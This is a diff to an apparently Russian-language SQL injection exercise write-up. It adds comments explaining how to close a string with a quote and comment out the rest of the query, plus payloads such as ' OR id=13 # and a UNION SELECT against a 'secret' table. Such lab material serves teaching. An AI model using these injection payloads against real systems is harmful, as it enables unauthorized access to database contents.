@@ -1661,6 +1661,7 @@ SELECT * FROM users
 
 №2
 ```tsql
+-- Закрываем строку с помощью ' и добавляем нужное условие. Оставшуюся часть строки комментируем
 ' OR id=9 #
 ```
 
@@ -1668,13 +1669,15 @@ SELECT * FROM users
 
 №3
 ```tsql
-# TODO: скрин утерян
+-- Закрываем строку с помощью ' и добавляем нужное условие. Оставшуюся часть строки комментируем
+' OR id=13 #
 ```
 
-
+![image](https://github.com/user-attachments/assets/40d44525-461f-420b-bb40-9f2e9f0f875a)
 
 №4
 ```tsql
+-- Закрываем строку с помощью ' и добавляем нужное условие. Оставшуюся часть строки комментируем
 ' UNION SELECT * FROM secret WHERE ggg='abc' # 
 ```
 
@@ -1711,13 +1714,3 @@ SELECT * FROM users
 ```
 
 ![image](https://github.com/user-attachments/assets/376a811d-f48d-4afd-acea-6f48c3529c5f)
-
-№8
-
-
-
-№9
-
-
-
-№10
